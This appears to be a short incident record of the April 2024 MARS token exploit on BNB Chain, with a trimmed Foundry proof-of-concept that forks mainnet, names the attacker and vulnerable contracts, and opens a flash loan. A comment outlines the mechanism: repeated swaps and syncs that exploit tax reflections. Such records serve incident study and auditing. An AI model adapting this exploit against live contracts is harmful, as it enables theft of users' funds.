# [?] MARS - Bad Reflection

## Summary
Severity: Unknown
Chain: BNB Chain
Component: MARS
Published: 2024-04-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/MARS_exp.sol
Type: defi-exploit-poc

## Details
Lost: >100K
References:
- https://twitter.com/Phalcon_xyz/status/1780150315603701933

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../interface.sol";

// Total Lost: >$100k
// Attacker: 0x306174b707ebf6d7301a0bcd898ae1666ec176ae
// Attack Contract: 0x797acb321cb10154aa807fcd1e155c34135483cd
// Attack Contract: 0x797acb321cb10154aa807fcd1e155c34135483cd
// Vulnerable Contract: 0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943
// Attack Tx: https://app.blocksec.com/explorer/tx/bsc/0x25e2af0a55581d5629a933af9fedd3c70e6d0c320f0b72700ca80e5cdd36c80b

// @Analyses
// https://twitter.com/Phalcon_xyz/status/1780150315603701933
// The pair contract can get reflections from taxes. Thus the attacker can user flashloan to repeated swap and sync for better pricing.

IPancakeV3Pool constant v3pair = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
IERC20 constant bnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IPancakeRouter constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
IERC20 constant MARS = IERC20(0x436D3629888B50127EC4947D54Bb0aB1120962A0);

contract MARS_EXP is Test {
    uint256 lending_amount = 350 ether;

    function setUp() public {
        vm.createSelectFork("bsc", 37_903_299); // fork BSC at block 37903299
    }

    function testExploit_MARS() public {
        v3pair.flash(address(this), 0, lending_amount, "");
    }

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/MARS_exp.sol_
